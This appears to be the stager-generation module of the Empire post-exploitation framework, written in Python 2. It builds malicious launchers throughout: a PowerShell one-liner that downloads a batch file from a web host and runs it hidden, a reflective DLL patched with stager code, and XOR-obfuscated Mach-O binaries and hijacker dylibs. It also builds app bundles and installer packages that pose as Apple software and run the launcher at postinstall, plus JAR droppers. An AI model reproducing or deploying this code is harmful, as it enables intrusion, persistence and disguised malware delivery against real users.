"""

Functionality that loads Empire stagers, sets generic stager options,
and abstracts the invocation of launcher generation.

The Stagers() class in instantiated in ./empire.py by the main menu and includes:

    load_stagers() - loads stagers from the install path
    set_stager_option() - sets and option for all stagers
    generate_launcher() - abstracted functionality that invokes the generate_launcher() method for a given listener
    generate_dll() - generates a PowerPick Reflective DLL to inject with base64-encoded stager code
    generate_macho() - generates a macho binary with an embedded python interpreter that runs the launcher code
    generate_dylib() - generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application

"""

import fnmatch
import imp
import helpers
import os
import macholib.MachO
import shutil
import zipfile
import subprocess
from itertools import izip, cycle
import base64


class Stagers:

    def __init__(self, MainMenu, args):

        self.mainMenu = MainMenu
        self.args = args

        # stager module format:
        #     [ ("stager_name", instance) ]
        self.stagers = {}

        self.load_stagers()


    def load_stagers(self):
        """
        Load stagers from the install + "/lib/stagers/*" path
        """

        rootPath = "%s/lib/stagers/" % (self.mainMenu.installPath)
        pattern = '*.py'

        print helpers.color("[*] Loading stagers from: %s" % (rootPath))

        for root, dirs, files in os.walk(rootPath):
            for filename in fnmatch.filter(files, pattern):
                filePath = os.path.join(root, filename)

                # don't load up any of the templates
                if fnmatch.fnmatch(filename, '*template.py'):
                    continue

                # extract just the module name from the full path
                stagerName = filePath.split("/lib/stagers/")[-1][0:-3]

                # instantiate the module and save it to the internal cache
                self.stagers[stagerName] = imp.load_source(stagerName, filePath).Stager(self.mainMenu, [])


    def set_stager_option(self, option, value):
        """
        Sets an option for all stagers.
        """

        for name, stager in self.stagers.iteritems():
            for stagerOption,stagerValue in stager.options.iteritems():
                if stagerOption == option:
                    stager.options[option]['Value'] = str(value)

    def generate_launcher_fetcher(self, language=None, encode=True, webFile='http://127.0.0.1/launcher.bat', launcher='powershell -noP -sta -w 1 -enc '):
        #TODO add handle for other than powershell language
        stager = 'wget "' + webFile + '" -outfile "launcher.bat"; Start-Process -FilePath .\launcher.bat -Wait -passthru -WindowStyle Hidden;'
        if encode:
            return helpers.powershell_launcher(stager, launcher)
        else:
            return stager


    def generate_launcher(self, listenerName, language=None, encode=True, obfuscate=False, obfuscationCommand="", userAgent='default', proxy='default', proxyCreds='default', stagerRetries='0', safeChecks='true'):
        """
        Abstracted functionality that invokes the generate_launcher() method for a given listener,
        if it exists.
        """

        if not listenerName in self.mainMenu.listeners.activeListeners:
            print helpers.color("[!] Invalid listener: %s" % (listenerName))
            return ''

        activeListener = self.mainMenu.listeners.activeListeners[listenerName]

        launcherCode = self.mainMenu.listeners.loadedListeners[activeListener['moduleName']].generate_launcher(encode=encode, obfuscate=obfuscate, obfuscationCommand=obfuscationCommand, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds, stagerRetries=stagerRetries, language=language, listenerName=listenerName, safeChecks=safeChecks)
        
        if launcherCode:
            return launcherCode


    def generate_dll(self, poshCode, arch):
        """
        Generate a PowerPick Reflective DLL to inject with base64-encoded stager code.
        """

        #read in original DLL and patch the bytes based on arch
        if arch.lower() == 'x86':
            origPath = "%s/data/misc/ReflectivePick_x86_orig.dll" % (self.mainMenu.installPath)
        else:
            origPath = "%s/data/misc/ReflectivePick_x64_orig.dll" % (self.mainMenu.installPath)

        if os.path.isfile(origPath):

            dllRaw = ''
            with open(origPath, 'rb') as f:
                dllRaw = f.read()

                replacementCode = helpers.decode_base64(poshCode)

                # patch the dll with the new PowerShell code
                searchString = (("Invoke-Replace").encode("UTF-16"))[2:]
                index = dllRaw.find(searchString)
                dllPatched = dllRaw[:index]+replacementCode+dllRaw[(index+len(replacementCode)):]

                return dllPatched

        else:
            print helpers.color("[!] Original .dll for arch %s does not exist!" % (arch))


    def generate_macho(self, launcherCode):
        """
        Generates a macho binary with an embedded python interpreter that runs the launcher code.
        """

        MH_EXECUTE = 2
        f = open("%s/data/misc/machotemplate" % (self.mainMenu.installPath), 'rb')
        # f = open(self.installPath + "/data/misc/machotemplate", 'rb')
        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
            print helpers.color("[!] Macho binary template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset) + (int(section.size) - 2119)
                            placeHolderSz = int(section.size) - (int(section.size) - 2119)

        template = f.read()
        f.close()

        if placeHolderSz and offset:

            key = 'subF'
            launcherCode = ''.join(chr(ord(x) ^ ord(y)) for (x,y) in izip(launcherCode, cycle(key)))
            launcherCode = base64.urlsafe_b64encode(launcherCode)
            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedMachO = template[:offset]+launcher+template[(offset+len(launcher)):]

            return patchedMachO
        else:
            print helpers.color("[!] Unable to patch MachO binary")


    def generate_dylib(self, launcherCode, arch, hijacker):
        """
        Generates a dylib with an embedded python interpreter and runs launcher code when loaded into an application.
        """
        import macholib.MachO

        MH_DYLIB = 6
        if hijacker.lower() == 'true':
            if arch == 'x86':
                f = open("%s/data/misc/hijackers/template.dylib" % (self.mainMenu.installPath), 'rb')
            else:
                f = open("%s/data/misc/hijackers/template64.dylib" % (self.mainMenu.installPath), 'rb')
        else:
            if arch == 'x86':
                f = open("%s/data/misc/templateLauncher.dylib" % (self.mainMenu.installPath), 'rb')
            else:
                f = open("%s/data/misc/templateLauncher64.dylib" % (self.mainMenu.installPath), 'rb')

        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_DYLIB:
            print helpers.color("[!] Dylib template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset)
                            placeHolderSz = int(section.size) - 52
        template = f.read()
        f.close()

        if placeHolderSz and offset:

            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedDylib = template[:offset]+launcher+template[(offset+len(launcher)):]

            return patchedDylib
        else:
            print helpers.color("[!] Unable to patch dylib")


    def generate_appbundle(self, launcherCode, Arch, icon, AppName, disarm):

        """
        Generates an application. The embedded executable is a macho binary with the python interpreter.
        """

        

        MH_EXECUTE = 2

        if Arch == 'x64':

            f = open(self.mainMenu.installPath + "/data/misc/apptemplateResources/x64/launcher.app/Contents/MacOS/launcher")
            directory = self.mainMenu.installPath + "/data/misc/apptemplateResources/x64/launcher.app/"
        else:
            f = open(self.mainMenu.installPath + "/data/misc/apptemplateResources/x86/launcher.app/Contents/MacOS/launcher")
            directory = self.mainMenu.installPath + "/data/misc/apptemplateResources/x86/launcher.app/"

        macho = macholib.MachO.MachO(f.name)

        if int(macho.headers[0].header.filetype) != MH_EXECUTE:
            print helpers.color("[!] Macho binary template is not the correct filetype")
            return ""

        cmds = macho.headers[0].commands

        for cmd in cmds:
            count = 0
            if int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT_64 or int(cmd[count].cmd) == macholib.MachO.LC_SEGMENT:
                count += 1
                if cmd[count].segname.strip('\x00') == '__TEXT' and cmd[count].nsects > 0:
                    count += 1
                    for section in cmd[count]:
                        if section.sectname.strip('\x00') == '__cstring':
                            offset = int(section.offset)
                            placeHolderSz = int(section.size) - 52

        template = f.read()
        f.close()

        if placeHolderSz and offset:

            launcher = launcherCode + "\x00" * (placeHolderSz - len(launcherCode))
            patchedBinary = template[:offset]+launcher+template[(offset+len(launcher)):]
            if AppName == "":
                AppName = "launcher"

            tmpdir = "/tmp/application/%s.app/" % AppName
            shutil.copytree(directory, tmpdir)
            f = open(tmpdir + "Contents/MacOS/launcher","wb")
            if disarm != True:
                f.write(patchedBinary)
                f.close()
            else:
                t = open(self.mainMenu.installPath+"/data/misc/apptemplateResources/empty/macho",'rb')
                w = t.read()
                f.write(w)
                f.close()
                t.close()

            os.rename(tmpdir + "Contents/MacOS/launcher",tmpdir + "Contents/MacOS/%s" % AppName)
            os.chmod(tmpdir+"Contents/MacOS/%s" % AppName, 0755)

            if icon != '':
                iconfile = os.path.splitext(icon)[0].split('/')[-1]
                shutil.copy2(icon,tmpdir+"Contents/Resources/"+iconfile+".icns")
            else:
                iconfile = icon
            appPlist = """<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>BuildMachineOSBuild</key>
    <string>15G31</string>
    <key>CFBundleDevelopmentRegion</key>
    <string>en</string>
    <key>CFBundleExecutable</key>
    <string>%s</string>
    <key>CFBundleIconFile</key>
    <string>%s</string>
    <key>CFBundleIdentifier</key>
    <string>com.apple.%s</string>
    <key>CFBundleInfoDictionaryVersion</key>
    <string>6.0</string>
    <key>CFBundleName</key>
    <string>%s</string>
    <key>CFBundlePackageType</key>
    <string>APPL</string>
    <key>CFBundleShortVersionString</key>
    <string>1.0</string>
    <key>CFBundleSignature</key>
    <string>????</string>
    <key>CFBundleSupportedPlatforms</key>
    <array>
        <string>MacOSX</string>
    </array>
    <key>CFBundleVersion</key>
    <string>1</string>
    <key>DTCompiler</key>
    <string>com.apple.compilers.llvm.clang.1_0</string>
    <key>DTPlatformBuild</key>
    <string>7D1014</string>
    <key>DTPlatformVersion</key>
    <string>GM</string>
    <key>DTSDKBuild</key>
    <string>15E60</string>
    <key>DTSDKName</key>
    <string>macosx10.11</string>
    <key>DTXcode</key>
    <string>0731</string>
    <key>DTXcodeBuild</key>
    <string>7D1014</string>
    <key>LSApplicationCategoryType</key>
    <string>public.app-category.utilities</string>
    <key>LSMinimumSystemVersion</key>
    <string>10.11</string>
    <key>LSUIElement</key>
    <true/>
    <key>NSHumanReadableCopyright</key>
    <string>Copyright 2016 Apple. All rights reserved.</string>
    <key>NSMainNibFile</key>
    <string>MainMenu</string>
    <key>NSPrincipalClass</key>
    <string>NSApplication</string>
</dict>
</plist>
""" % (AppName, iconfile, AppName, AppName)
            f = open(tmpdir+"Contents/Info.plist", "w")
            f.write(appPlist)
            f.close()

            shutil.make_archive("/tmp/launcher", 'zip', "/tmp/application")
            shutil.rmtree('/tmp/application')

            f = open("/tmp/launcher.zip","rb")
            zipbundle = f.read()
            f.close()
            os.remove("/tmp/launcher.zip")
            return zipbundle
        
            
        else:
            print helpers.color("[!] Unable to patch application")

    def generate_pkg(self, launcher, bundleZip, AppName):

        #unzip application bundle zip. Copy everything for the installer pkg to a temporary location
        currDir = os.getcwd()
        os.chdir("/tmp/")
        f = open("app.zip","wb")
        f.write(bundleZip)
        f.close()
        zipf = zipfile.ZipFile('app.zip','r')
        zipf.extractall()
        zipf.close()
        os.remove('app.zip')

        os.system("cp -r "+self.mainMenu.installPath+"/data/misc/pkgbuild/ /tmp/")
        os.chdir("pkgbuild")
        os.system("cp -r ../"+AppName+".app root/Applications/")
        os.system("chmod +x root/Applications/")
        os.system("( cd root && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Payload")
        os.system("chmod +x expand/Payload")
        s = open('scripts/postinstall','r+')
        script = s.read()
        script = script.replace('LAUNCHER',launcher)
        s.seek(0)
        s.write(script)
        s.close()
        os.system("( cd scripts && find . | cpio -o --format odc --owner 0:80 | gzip -c ) > expand/Scripts")
        os.system("chmod +x expand/Scripts")
        numFiles = subprocess.check_output("find root | wc -l",shell=True).strip('\n')
        size = subprocess.check_output("du -b -s root",shell=True).split('\t')[0]
        size = int(size) / 1024
        p = open('expand/PackageInfo','w+')
        pkginfo = """<?xml version="1.0" encoding="utf-8" standalone="no"?>
<pkg-info overwrite-permissions="true" relocatable="false" identifier="com.apple.APPNAME" postinstall-action="none" version="1.0" format-version="2" generator-version="InstallCmds-554 (15G31)" install-location="/" auth="root">
    <payload numberOfFiles="KEY1" installKBytes="KEY2"/>
    <bundle path="./APPNAME.app" id="com.apple.APPNAME" CFBundleShortVersionString="1.0" CFBundleVersion="1"/>
    <bundle-version>
        <bundle id="com.apple.APPNAME"/>
    </bundle-version>
    <upgrade-bundle>
        <bundle id="com.apple.APPNAME"/>
    </upgrade-bundle>
    <update-bundle/>
    <atomic-update-bundle/>
    <strict-identifier>
        <bundle id="com.apple.APPNAME"/>
    </strict-identifier>
    <relocate>
        <bundle id="com.apple.APPNAME"/>
    </relocate>
    <scripts>
        <postinstall file="./postinstall"/>
    </scripts>
</pkg-info>
"""
        pkginfo = pkginfo.replace('APPNAME',AppName)
        pkginfo = pkginfo.replace('KEY1',numFiles)
        pkginfo = pkginfo.replace('KEY2',str(size))
        p.write(pkginfo)
        p.close()
        os.system("mkbom -u 0 -g 80 root expand/Bom")
        os.system("chmod +x expand/Bom")
        os.system("chmod -R 755 expand/")
        os.system('( cd expand && xar --compression none -cf "../launcher.pkg" * )')
        f = open('launcher.pkg','rb')
        package = f.read()
        os.chdir("/tmp/")
        shutil.rmtree('pkgbuild')
        shutil.rmtree(AppName+".app")
        return package

    def generate_jar(self, launcherCode):
        file = open(self.mainMenu.installPath+'data/misc/Run.java','r')
        javacode = file.read()
        file.close()
        javacode = javacode.replace("LAUNCHER",launcherCode)
        file = open(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java','w')
        file.write(javacode)
        file.close()
        currdir = os.getcwd()
        os.chdir(self.mainMenu.installPath+'data/misc/classes/')
        os.system('javac com/installer/apple/Run.java')
        os.system('jar -cfe '+self.mainMenu.installPath+'Run.jar com.installer.apple.Run com/installer/apple/Run.class')
        os.chdir(currdir)
        os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.class')
        os.remove(self.mainMenu.installPath+'data/misc/classes/com/installer/apple/Run.java')
        jarfile = open('Run.jar','rb')
        jar = jarfile.read()
        jarfile.close()
        os.remove('Run.jar')

        return jar 
